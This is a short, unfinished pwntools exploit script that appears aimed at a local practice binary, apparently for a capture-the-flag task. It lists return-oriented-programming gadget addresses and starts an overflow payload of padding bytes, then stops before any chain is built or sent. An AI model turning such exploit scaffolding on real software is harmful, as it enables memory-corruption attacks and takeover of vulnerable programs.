from pwn import *

r = process("./a.out")

# add dword ptr [rbp - 0x3d], ebx ; nop ; ret
gadget1 = 0x40111c

pop_rbp_ret = 0x40111d
pop_rbx_rbp_4_ret = 0x4011ba


payload = b'a'*0x18

